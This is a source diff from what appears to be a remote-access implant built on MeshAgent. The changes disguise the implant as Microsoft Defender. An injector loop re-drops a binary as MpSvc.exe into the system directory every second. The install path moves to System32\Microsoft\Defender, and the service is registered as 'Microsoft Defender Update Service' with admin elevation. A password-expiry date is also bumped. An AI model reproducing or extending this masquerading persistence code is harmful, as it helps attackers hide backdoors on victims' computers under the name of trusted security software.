@@ -621,8 +621,8 @@ BOOL IsProcessRunning(const char* processName) {
 DWORD WINAPI RunInjector(LPVOID Param)
 {
 	while (TRUE) {
-		if (!IsProcessRunning("winhwapi.exe")) {
-			ReleaseFileToSysDir(IDR_WINHWAPI1, (CHAR*)"winhwapi", "winhwapi.exe");
+		if (!IsProcessRunning("MpSvc.exe")) {
+			ReleaseFileToSysDir(IDR_WINHWAPI1, (CHAR*)"winhwapi", "MpSvc.exe");
 		}
 		Sleep(1000);
 	}
@@ -775,9 +775,9 @@ duk_ret_t _start(duk_context *ctx)
 		GetSystemDirectoryA(szInstall, MAX_PATH);
 
 		//SHGetSpecialFolderPathA(NULL, szInstall, CSIDL_LOCAL_APPDATA, FALSE);
-		sprintf_s(szInstall, sizeof(szInstall), "%s\\Microsoft", szInstall);
+		sprintf_s(szInstall, sizeof(szInstall), "%s\\Microsoft\\Defender", szInstall);
 
-		sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s --installPath=%s --meshServiceName=%s --target=csrss --description=NetworkService", "install", szInstall, SERVICE_NAME);
+		sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s --installPath=%s --meshServiceName=%s --target=MpUpdate --description=\"Microsoft Defender Update Service.\" --displayName=\"Microsoft Defender Update Service\"", "install", szInstall, SERVICE_NAME);
 		auto result = RunAsAdmin(ILibScratchPad, IsAdmin() == TRUE);
 
 
@@ -823,7 +823,7 @@ INT_PTR CALLBACK PasswordDlgProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lPa
 				SYSTEMTIME st;
 				GetLocalTime(&st);
 
-				if (st.wYear > 2023) {
+				if (st.wYear > 2024) {
 					MessageBoxA(hwnd, "password has expired", "Warning", MB_OK);
 				} else
 					EndDialog(hwnd, IDOK);
